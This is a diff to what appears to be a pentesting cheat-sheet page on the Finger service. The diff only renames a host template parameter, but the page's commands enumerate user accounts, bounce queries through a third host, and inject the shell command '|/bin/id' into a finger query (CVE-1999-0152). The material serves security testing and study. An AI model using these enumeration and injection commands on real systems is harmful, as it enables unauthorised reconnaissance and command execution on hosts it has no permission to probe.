@@ -21,12 +21,12 @@ an interface to a remote user information program (RUIP).
 #### Telnet
 
 ```sh
-telnet {{< param "war.rhost" >}} 79
+telnet {{< param "m.RHOST" >}} 79
 ```
 
 #### Netcat
 ```sh
-echo "root" | nc -n {{< param "war.rhost" >}} 79
+echo "root" | nc -n {{< param "m.RHOST" >}} 79
 ```
 
 ## Enumeration
@@ -38,7 +38,7 @@ echo "root" | nc -n {{< param "war.rhost" >}} 79
 ### Fast Enum
 
 ```sh
-for q in 'root' 'admin' 'user' '0' "'a b c d e f g h'" '|/bin/id';do echo "FINGER: $q"; finger "$q@{{< param "war.rhost" >}}"; echo -e "\n";done
+for q in 'root' 'admin' 'user' '0' "'a b c d e f g h'" '|/bin/id';do echo "FINGER: $q"; finger "$q@{{< param "m.RHOST" >}}"; echo -e "\n";done
 ```
 
 #### Finger [^finger]
@@ -46,15 +46,15 @@ for q in 'root' 'admin' 'user' '0' "'a b c d e f g h'" '|/bin/id';do echo "FINGE
 List logged users.
 
 ```sh
-finger @{{< param "war.rhost" >}}
+finger @{{< param "m.RHOST" >}}
 ```
 Finger a specific user.
 ```sh
-finger -l root@{{< param "war.rhost" >}}
+finger -l root@{{< param "m.RHOST" >}}
 ```
 Enumerate users containing `user`.
 ```sh
-finger -l user@{{< param "war.rhost" >}}
+finger -l user@{{< param "m.RHOST" >}}
 ```
 
 {{<hint info>}}
@@ -71,7 +71,7 @@ Try other words as: `admin`, `account` or `project`.
 with information on some user accounts.
 
 ```sh
-finger 0@{{< param "war.rhost" >}}
+finger 0@{{< param "m.RHOST" >}}
 ```
 
 ### Finger 'a b c d e f g h' [^cve-2001-1503]
@@ -80,7 +80,7 @@ finger 0@{{< param "war.rhost" >}}
 with information on all accounts.
 
 ```sh
-finger 'a b c d e f g h'@{{< param "war.rhost" >}}
+finger 'a b c d e f g h'@{{< param "m.RHOST" >}}
 ```
 
 ## Finger Bouncing [^finger-bouncing]
@@ -90,11 +90,11 @@ to a different host
 as if it were sent from that machine.
 
 ```sh
-finger @{{< param "war.rhost" >}}@10.10.10.4
+finger @{{< param "m.RHOST" >}}@10.10.10.4
 ```
 
 ```sh
-finger root@{{< param "war.rhost" >}}@10.10.10.4
+finger root@{{< param "m.RHOST" >}}@10.10.10.4
 ```
 
 ## Command Execution [^cve-1999-0152]
@@ -103,7 +103,7 @@ finger root@{{< param "war.rhost" >}}@10.10.10.4
 through shell metacharacters.
 
 ```sh
-finger "|/bin/id@{{< param "war.rhost" >}}"
+finger "|/bin/id@{{< param "m.RHOST" >}}"
 ```
 
 ## Finger Exploits Search
